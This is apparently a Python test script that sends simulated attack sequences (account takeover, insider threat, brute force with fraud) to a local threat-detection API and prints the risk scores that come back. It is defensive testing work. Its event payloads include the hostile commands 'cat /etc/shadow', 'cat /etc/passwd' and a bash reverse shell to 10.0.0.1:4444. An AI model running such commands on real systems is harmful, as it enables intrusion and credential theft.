"""realistic multi step attack sequence through the live API """
import sys
import time
import requests
from pathlib import Path
import os
from dotenv import load_dotenv


load_dotenv()

BASE_URL = os.getenv("SENTINEL_URL", "http://localhost:8000")
USERNAME = os.getenv("SENTINEL_USER")
PASSWORD = os.getenv("SENTINEL_PASSWORD")
DELAY    = float(os.getenv("SENTINEL_DELAY", "2.5"))

if not USERNAME or not PASSWORD:
    print("SENTINEL_USER and SENTINEL_PASSWORD must be set in your file.")
    sys.exit(1)

#sequence of events to simulate
SEQUENCES = {
    "takeover": {
        "name": "Account Takeover",
        "description": "Brute force → off-hours access → large transaction from new device",
        "steps": [
            {
                "label": "Multiple failed logins from unknown IP",
                "type": "activity",
                "payload": {
                    "username": "victim_user",
                    "ip_address": "45.33.32.156",
                    "timestamp": "2024-11-01T02:10:00",
                    "failed_logins": 9,
                    "command": "",
                },
            },
            {
                "label": "Successful off-hours access from same IP",
                "type": "activity",
                "payload": {
                    "username": "victim_user",
                    "ip_address": "45.33.32.156",
                    "timestamp": "2024-11-01T02:15:00",
                    "failed_logins": 0,
                    "command": "cat /etc/shadow",
                },
            },
            {
                "label": "Large transaction from unrecognised device",
                "type": "transaction",
                "payload": {
                    "account_id":      "victim_user",
                    "amount":          85000.00,
                    "currency":        "ZAR",
                    "location":        "Lagos",
                    "last_location":   "Johannesburg",
                    "device_id":       "unknown_device_001",
                    "known_devices":   ["device_trusted_home"],
                    "recent_tx_count": 1,
                    "timestamp":       "2024-11-01T02:20:00",
                    "username":        "victim_user",
                    "ip_address":      "45.33.32.156",
                },
            },
        ],
    },

    "insider": {
        "name": "Insider Threat",
        "description": "Normal login → suspicious commands → rapid transactions to new location",
        "steps": [
            {
                "label": "Normal business-hours login",
                "type": "activity",
                "payload": {
                    "username":      "insider_bob",
                    "ip_address":    "10.0.0.45",
                    "timestamp":     "2024-11-01T09:00:00",
                    "failed_logins": 0,
                    "command":       "ls -la",
                },
            },
            {
                "label": "Sensitive file access detected",
                "type": "activity",
                "payload": {
                    "username":      "insider_bob",
                    "ip_address":    "10.0.0.45",
                    "timestamp":     "2024-11-01T09:05:00",
                    "failed_logins": 0,
                    "command":       "cat /etc/passwd",
                },
            },
            {
                "label": "Rapid transactions to new location",
                "type": "transaction",
                "payload": {
                    "account_id":      "insider_bob",
                    "amount":          12000.00,
                    "currency":        "ZAR",
                    "location":        "Dubai",
                    "last_location":   "Cape Town",
                    "device_id":       "device_bob_work",
                    "known_devices":   ["device_bob_work"],
                    "recent_tx_count": 5,
                    "timestamp":       "2024-11-01T09:10:00",
                    "username":        "insider_bob",
                    "ip_address":      "10.0.0.45",
                },
            },
        ],
    },

    "bruteforce": {
        "name": "Brute Force + Fraud",
        "description": "Sustained brute force → reverse shell → full fraud transaction",
        "steps": [
            {
                "label": "Sustained brute force from external IP",
                "type": "activity",
                "payload": {
                    "username":      "target_alice",
                    "ip_address":    "203.0.113.99",
                    "timestamp":     "2024-11-01T01:45:00",
                    "failed_logins": 12,
                    "command":       "",
                },
            },
            {
                "label": "Reverse shell command executed",
                "type": "activity",
                "payload": {
                    "username":      "target_alice",
                    "ip_address":    "203.0.113.99",
                    "timestamp":     "2024-11-01T01:50:00",
                    "failed_logins": 0,
                    "command":       "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
                },
            },
            {
                "label": "Max-value fraudulent transaction",
                "type": "transaction",
                "payload": {
                    "account_id":      "target_alice",
                    "amount":          99000.00,
                    "currency":        "ZAR",
                    "location":        "Moscow",
                    "last_location":   "Johannesburg",
                    "device_id":       "hacked_device",
                    "known_devices":   [],
                    "recent_tx_count": 8,
                    "timestamp":       "2024-11-01T01:55:00",
                    "username":        "target_alice",
                    "ip_address":      "203.0.113.99",
                },
            },
        ],
    },
}
# Auth
def get_token() -> str:
    resp = requests.post(
        f"{BASE_URL}/auth/login",
        json={"username": USERNAME, "password": PASSWORD},
    )
    if resp.status_code != 200:
        print(f"Login failed: {resp.text}")
        sys.exit(1)
    return resp.json()["access_token"]

# fire off the sequence and events 
def fire(event_type: str, payload: dict, token: str) -> dict:
    endpoint = f"{BASE_URL}/events/{event_type}"
    resp = requests.post(
        endpoint,
        json=payload,
        headers={"Authorization": f"Bearer {token}"},
    )
    if resp.status_code != 200:
        print(f"  API error {resp.status_code}: {resp.text}")
        return {}
    return resp.json()

# run the sequence
def run_sequence(key: str, token: str):
    seq = SEQUENCES[key]
    total = len(seq["steps"])

    print(f"\n{'═' * 58}")
    print(f"  {seq['name']}")
    print(f"  {seq['description']}")
    print(f"{'═' * 58}")
    for i, step in enumerate(seq["steps"], 1):
            print(f"\n  [{i}/{total}] {step['label']}")
            result = fire(step["type"], step["payload"], token)
            if result:
                score = result.get("risk_score", "?")
                level = result.get("alert_level", "?")
                inc_id = result.get("id", "?")
                print(f"         Score : {score}/100  Level : {level}  ID : {inc_id}")
                if result.get("severity_rationale"):
                    print(f"         {result['severity_rationale'][:90]}...")
            if i < total:
                time.sleep(DELAY)

    print(f"\n  Sequence complete — {total} incidents created.")
